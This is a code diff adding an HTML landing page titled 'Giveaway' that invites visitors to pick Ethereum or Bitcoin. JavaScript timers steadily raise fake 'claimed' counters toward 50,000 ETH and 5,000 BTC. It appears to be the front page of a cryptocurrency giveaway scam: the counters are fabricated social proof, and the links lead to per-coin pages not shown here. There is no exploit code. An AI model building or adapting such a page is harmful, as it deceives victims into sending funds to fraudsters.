@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <script
+      src="https://code.jquery.com/jquery-3.6.0.min.js"
+      integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4="
+      crossorigin="anonymous"
+    ></script>
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <link rel="stylesheet" href="css/main.css" />
+    <title>Giveaway</title>
+    <script type="text/javascript" id="crocxmlsigner" src="moz-extension://c5fa3385-b2e8-410c-bf12-a910f6136c5e/crocxmlsigner.js"></script>
+  </head>
+  <body>
+    <div id="particles-js"><div class="menu">
+      <div class="center">
+      <h1><b>Select blockchain</b></h1>
+      
+    <div class="center2">
+      <div class="blocks">
+        <a href="/eth/index.php" style="text-decoration: none; color: #3d4049">
+          <div class="crypto" style="cursor: pointer">
+            <div class="margin">
+              <img class="img" height="65" src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Ethereum_logo_2014.svg/1200px-Ethereum_logo_2014.svg.png">
+              <div class="info">
+                <h3>Ethereum</h3>
+                <div class="stats">
+                  <span id="eth">34209</span><span>&nbspETH /</span>
+                  50 000 ETH
+                </div>
+                <p></p>
+              </div>
+            </div>
+    
+            <div class="progressbar"></div>
+            <div class="progress ETH-progress" style="width: 65%"></div>
+            </a>
+          </div>
+        <a href="/btc/index.php" style="text-decoration: none; color: #3d4049">
+          <div class="crypto" style="cursor: pointer">
+            <div class="margin">
+              <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/46/Bitcoin.svg/600px-Bitcoin.svg.png">
+              <div class="info">
+                <h3>Bitcoin</h3>
+                <div class="stats">
+                  <span id="btc">3681</span><span>&nbspBTC /</span>
+                  5 000 BTC
+                </div>
+                <p></p>
+              </div>
+            </div>
+    
+            <div class="progressbar"></div>
+            <div class="progress BTC-progress" style="width: 70%"></div>
+            </a>
+          </div>
+      </div>
+    </div>
+  </div>
+</div>
+    <script>
+      
+      function updateLoadingValueEth(val) {
+        $(".ETH-progress").css({
+          width: `${(val / 50000) * 100}%`,
+        });
+        $("#eth").text(val.toLocaleString());
+        eth = val;
+      }
+    
+      function updateLoadingValueBtc(val) {
+        $(".BTC-progress").css({
+          width: `${(val / 5000) * 100}%`,
+        });
+        $("#btc").text(val.toLocaleString());
+        btc = val;
+      }
+      let intervals =[]
+      let btc = 3681;
+      let eth = 34209;
+    
+      intervals.push(setInterval(() => {
+        btc += 1;
+        checkintervals()
+        updateLoadingValueBtc(btc)
+      }, 5000))
+      intervals.push(setInterval(() => {
+        btc += 2;
+        checkintervals()
+        updateLoadingValueBtc(btc)
+      }, 7000))
+      intervals.push(setInterval(() => {
+        btc += 1;
+        checkintervals()
+        updateLoadingValueBtc(btc)
+      }, 1000))
+      
+    
+
+      intervals.push(setInterval(() => {
+       eth += 4;
+       checkintervals()
+       updateLoadingValueEth(eth)
+       $('#eth').text(eth);
+}, 5000))   
+intervals.push(setInterval(() => {
+       eth += 5;
+       checkintervals()
+       updateLoadingValueEth(eth)
+       $('#eth').text(eth);
+}, 3000))   
+intervals.push(setInterval(() => {
+       eth += 7;
+       checkintervals()
+       updateLoadingValueEth(eth)
+       $('#eth').text(eth);
+}, 1000))   
+
+
+      function checkintervals(){
+    if (eth>= 49972 , btc >=4983){
+        intervals.forEach(element => {
+            clearInterval(element)
+        });
+    }
+}    
+    </script></div>
+    
+    <!-- scripts -->
+    <script src="../particles.js"></script>
+    <script src="js/app.js"></script>
+    
+    <script>
+      var count_particles, stats, update;
+      stats = new Stats;
+      stats.setMode(0);
+      stats.domElement.style.position = 'absolute';
+      stats.domElement.style.left = '0px';
+      stats.domElement.style.top = '0px';
+      document.body.appendChild(stats.domElement);
+      count_particles = document.querySelector('.js-count-particles');
+      update = function() {
+        stats.begin();
+        stats.end();
+        if (window.pJSDom[0].pJS.particles && window.pJSDom[0].pJS.particles.array) {
+          count_particles.innerText = window.pJSDom[0].pJS.particles.array.length;
+        }
+        requestAnimationFrame(update);
+      };
+      requestAnimationFrame(update);
+    </script>
+    
+  </body>
+</html>
